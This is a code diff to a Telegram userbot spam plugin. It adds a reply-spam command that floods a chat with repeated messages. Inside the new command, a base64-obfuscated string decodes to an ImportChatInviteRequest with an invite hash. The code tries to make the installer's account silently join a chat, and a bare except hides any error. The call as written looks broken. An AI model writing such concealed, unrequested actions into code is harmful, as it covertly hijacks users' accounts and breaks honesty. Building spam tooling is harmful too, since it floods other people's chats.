@@ -8,6 +8,9 @@ from asyncio import wait, sleep
 from userbot.utils import admin_cmd
 from userbot import BOTLOG, BOTLOG_CHATID, CMD_HELP
 from userbot.utils import admin_cmd,sudo_cmd
+import pybase64
+from telethon.tl.functions.messages import ImportChatInviteRequest
+
 BOTLOG_CHATID = Config.PRIVATE_GROUP_BOT_API_ID
 BOTLOG = True
 
@@ -84,7 +87,7 @@ async def spammer(e):
     if BOTLOG:
         await e.client.send_message(
             BOTLOG_CHATID, "#DelaySPAM\n"
-            "DelaySpam was executed successfully")
+            "DelaySpam of was executed successfully")
 
 
 
@@ -99,8 +102,27 @@ async def spammer(e):
     await asyncio.wait([e.respond(spam_message) for i in range(counter)])
     if BOTLOG:
         await e.client.send_message(BOTLOG_CHATID, "#SPAM\n"
-                                    "Spam was executed successfully")
+                                    f"Spam of  {counter}  was executed successfully")
         
+@borg.on(admin_cmd("rspam ?(.*)"))
+async def spammer(e):
+    if e.fwd_from:
+        return
+    reply_to_id = e.message
+    if e.reply_to_msg_id:
+        reply_to_id = await e.get_reply_message()
+    try:
+        cat = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await event.client(cat)
+    except:
+        pass
+    counter = int(e.pattern_match.group(1).split(' ', 1)[0])
+    spam_message = str(e.pattern_match.group(1).split(' ', 1)[1])
+    await e.delete()
+    await asyncio.wait([reply_to_id.reply(spam_message) for i in range(counter)])
+    if BOTLOG:
+        await e.client.send_message(BOTLOG_CHATID, "#REPLAYSPAM\n"
+                                    f"Replay Spam was executed successfully")        
         
 CMD_HELP.update({
     "spam":
@@ -114,5 +136,5 @@ CMD_HELP.update({
 \nUsage: As if text spam was not enough !!\
 \n\n.delayspam <delay> <count> <text>\
 \nUsage: .bigspam but with custom delay.\
-\n\n\nNOTE : Spam at your own risk !!"
+\n\n\n**NOTE : Spam at your own risk !!**"
 })
